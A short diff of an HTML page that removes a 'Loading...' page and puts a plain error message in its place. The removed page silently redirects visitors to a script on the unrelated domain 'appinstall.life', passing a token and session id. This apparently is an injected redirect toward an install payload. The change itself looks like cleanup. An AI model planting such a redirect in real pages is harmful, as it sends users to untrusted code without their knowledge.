@@ -1,1 +1,10 @@
-<html><head><title>Loading...</title></head><body><script type='text/javascript'>window.location.replace('http://adad23u.appinstall.life/dist/maoerfm/index.js?ch=1&js=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJKb2tlbiIsImV4cCI6MTc4MzI4MTc3NiwiaWF0IjoxNzgzMjc0NTc2LCJpc3MiOiJKb2tlbiIsImpzIjoxLCJqdGkiOiIzMnZuZGhyMHQ1azRmczJkOW8xZXJzMDUiLCJuYmYiOjE3ODMyNzQ1NzYsInRzIjoxNzgzMjc0NTc2MTU4NDMxfQ.Oue4uxwh_UXzTtcvT9jis_XiQi3HJHm7pai2OIsbKBs&sid=bffe4e4d-789b-11f1-a0ae-59b06d0ff869');</script></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+</head>
+<body>
+<div align=center>
+  <h3>Error. Page cannot be displayed. Please contact your service provider for more details.</h3>
+</div>
+</body>
+</html>
